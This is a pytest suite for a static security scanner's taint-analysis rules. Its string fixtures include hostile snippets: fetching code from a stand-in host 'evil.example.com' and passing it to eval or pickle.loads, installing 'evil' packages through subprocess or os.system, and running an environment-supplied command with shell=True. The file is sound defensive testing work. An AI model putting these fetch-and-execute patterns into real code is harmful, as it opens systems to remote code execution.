"""Coverage tests for the REQ-3c findings engine taint analysis paths."""
from __future__ import annotations

import ast

import pytest

from scarno.findings.engine import apply_rules


def _scan(source: str, filename: str = "test.py"):
    tree = ast.parse(source)
    return apply_rules(filename, source, tree)


class TestFindingsEngineCoverage:
    @pytest.mark.requirement("SF-006")
    def test_subprocess_pip_install(self):
        findings = _scan(
            "import subprocess\n"
            "subprocess.run(['pip', 'install', 'evil-pkg'])\n",
            "deploy.py",
        )
        assert any(f.rule_id == "TS-SI-001" for f in findings)

    @pytest.mark.requirement("SF-006")
    def test_python_m_pip(self):
        findings = _scan(
            "import subprocess\n"
            "subprocess.run(['python', '-m', 'pip', 'install', 'evil'])\n",
            "setup.py",
        )
        # 'python -m pip install' → TS-SI-002 (distinct from bare pip → TS-SI-001)
        assert any(f.rule_id == "TS-SI-002" for f in findings)

    @pytest.mark.requirement("SF-006")
    def test_os_system_pip(self):
        findings = _scan(
            "import os\nos.system('pip install evil-pkg')\n", "deploy.py"
        )
        assert any(f.rule_id == "TS-SI-003" for f in findings)

    @pytest.mark.requirement("SF-007")
    def test_eval_network_response(self):
        findings = _scan(
            "import urllib.request\n"
            "resp = urllib.request.urlopen('https://evil.example.com/code')\n"
            "code = resp.read()\n"
            "eval(code)\n",
            "loader.py",
        )
        rule_ids = {f.rule_id for f in findings}
        assert rule_ids & {"TS-CE-001", "TS-CE-002"}

    @pytest.mark.requirement("SF-007")
    def test_pickle_load_network(self):
        findings = _scan(
            "import pickle, urllib.request\n"
            "resp = urllib.request.urlopen('https://evil.example.com/data.pkl')\n"
            "data = pickle.loads(resp.read())\n",
            "loader.py",
        )
        assert any(f.rule_id == "TS-CE-003" for f in findings)

    @pytest.mark.requirement("SF-008")
    def test_dynamic_import_from_env(self):
        findings = _scan(
            "import os\nmod = os.environ.get('PLUGIN')\n__import__(mod)\n",
            "plugin.py",
        )
        assert any(f.rule_id == "TS-CE-004" for f in findings)

    @pytest.mark.requirement("SF-009")
    def test_setup_py_dynamic_deps(self):
        # TS-DS-001 — setup(install_requires=<non-literal>) in setup.py
        findings = _scan(
            "from setuptools import setup\n"
            "import json\n"
            "reqs = json.load(open('reqs.json'))\n"
            "setup(install_requires=reqs)\n",
            "setup.py",
        )
        assert any(f.rule_id == "TS-DS-001" for f in findings)

    @pytest.mark.requirement("SF-007")
    def test_setup_py_literal_deps_no_finding(self):
        # setup(install_requires=["foo"]) with a literal list should NOT fire
        findings = _scan(
            "from setuptools import setup\n"
            "setup(install_requires=['requests', 'flask'])\n",
            "setup.py",
        )
        assert not any(f.rule_id == "TS-DS-001" for f in findings)

    @pytest.mark.requirement("SF-007")
    def test_setup_py_non_setup_file_no_finding(self):
        # Same pattern in a non-setup.py file should NOT fire
        findings = _scan(
            "from setuptools import setup\n"
            "setup(install_requires=get_reqs())\n",
            "configure.py",
        )
        assert not any(f.rule_id == "TS-DS-001" for f in findings)

    @pytest.mark.requirement("SF-006")
    def test_pip_main_call(self):
        findings = _scan(
            "import pip\npip.main(['install', 'evil'])\n",
            "installer.py",
        )
        assert any(f.rule_id == "TS-SI-004" for f in findings)

    @pytest.mark.requirement("SF-006")
    def test_clean_source_no_findings(self):
        findings = _scan(
            "import json\ndata = json.loads('{}')\nprint(data)\n",
            "clean.py",
        )
        assert findings == []

    @pytest.mark.requirement("SF-006")
    def test_shell_true_with_taint(self):
        findings = _scan(
            "import subprocess, os\n"
            "cmd = os.environ['CMD']\n"
            "subprocess.run(cmd, shell=True)\n",
            "risky.py",
        )
        assert any(f.rule_id == "TS-CE-006" for f in findings)

    @pytest.mark.requirement("SF-006")
    def test_inline_suppression(self):
        findings = _scan(
            "import subprocess\n"
            "subprocess.run(['pip', 'install', 'pkg'])  # scarno: allow TS-SI-001\n",
            "deploy.py",
        )
        suppressed = [f for f in findings if f.suppressed]
        assert any(f.rule_id == "TS-SI-001" for f in suppressed)
